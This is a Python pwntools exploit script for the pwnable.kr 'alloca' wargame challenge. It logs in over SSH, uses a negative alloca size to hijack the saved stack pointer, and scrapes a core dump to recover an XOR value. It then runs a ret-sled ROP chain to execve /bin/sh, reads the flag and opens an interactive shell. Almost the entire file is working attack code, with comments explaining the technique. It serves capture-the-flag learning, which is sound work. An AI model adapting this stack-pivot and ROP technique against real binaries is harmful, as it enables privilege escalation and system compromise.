#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn      import *

host     = 'pwnable.kr'
user     = 'alloca'
password = 'guest'
binary   = '/home/%s/%s' % (user,user)
chal     = os.path.basename(binary)
shell    = ssh(host=host, user=user, password=password, port=2222)

if not os.path.exists(chal):
    shell.download_file(binary)
    shell.download_file(binary + '.c')
    os.chmod(chal, 0755)

#
# Disable ASLR so that DSO addresses are constant.
#
context.aslr = False

#
# Using a negative value for alloca allows us to overwrite the saved value
# of ESP on the stack.
#
# The offset which gives us this control is -92, though -88 throuh -96 also
# work.
#
# Because of the way things work out, the stack value will be XORed with
# some random stack trash.  On the up-side, it is consistent from run-to-run.
# On the downside, it is not consistent between different versions of libc.
#
# In order to have a portable exploit (works locally and remotely), we will
# force the target binary to crash once, and scrape the value of ESP at the
# segfault by loading a corefile.
#

# In order for a corefile to drop, we have to be in a writable directory
shell.set_working_directory()
shell('ln -s %s .' % binary)

#
# Launch the process, and let it die a terrible death
#
# Note that we need the setuid bit to be ignored in order for a corefile we
# can use to be dropped.
#
p = shell.process('./alloca',
                  setuid=0)

address = 0xdeadbeef
cookie = str(signed(address))
pattern = cyclic(64)
data = fit({0: '-92',
            16: cookie,
            32: pattern},
            filler='\n')

#
# All of the data should be sent at the same time, so that it is all
# buffered at once.  The fgets() is actually a noop since the value is negative.
#
# We are relying on the buffering behavior of scanf().
#
p.sendline(data)
p.recvall()

# Grab the corefile after it's written.  It may take a second or two to appear.
pause(2)
shell.download('core')
core = Core('core')

# We want to be sure that we crashed at the 'ret'
# Either we'll crash at that instruction (stack pointer is invalid)
# or at zero (stack pointer was valid, pointed at an empty page).
assert core.eip in (0x804878a, 0)

# Find out the XOR value. This is almost-always constant, but varies by 1 bit
# on the pwnable.kr server as of writing.  Luckily, the 1 bit that changes is
# the '4' bit, so as long as we pad an extra 'ret' in our ROP, we're fine.
xor = address ^ core.esp
log.info("%08x xor magic" % xor)

# Find our data in the heap
address = core.search(pattern).next()
log.info("%08x heap address" % address)

#
# We need a bit of a RET sled because the XOR value isn't perfectly constant,
# but only varies by a small amount which we can account for.
#
libc = p.libc
rop = ROP(libc)
log.info("libc is at %#x" % libc.address)
binsh = libc.search('/bin/sh\x00').next()
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.execve(binsh,0,0)
log.info(rop.dump())

# Shoot for the middle of the RET sled
address += 8

# One very last time, to pwn it proper!
cookie = str(signed(address ^ xor))
data = fit({0: '-92',
            16: cookie,
            32: str(rop)},
            filler='\n')


p = shell.process('./alloca')

# shell.upload('~/bin/gdbserver')
# shell('chmod +x gdbserver')

# p = gdb.debug('./alloca', '''
# break *0x804878a
# set follow-fork-mode child
# catch exec
# continue
# ''', ssh=shell)

p.sendline(data)

p.recvuntil('$')
p.clean()
p.sendline('cat /home/alloca/flag')
flag = p.recvline().strip()
log.success('Flag: %r' % flag)

p.interactive(prompt='')
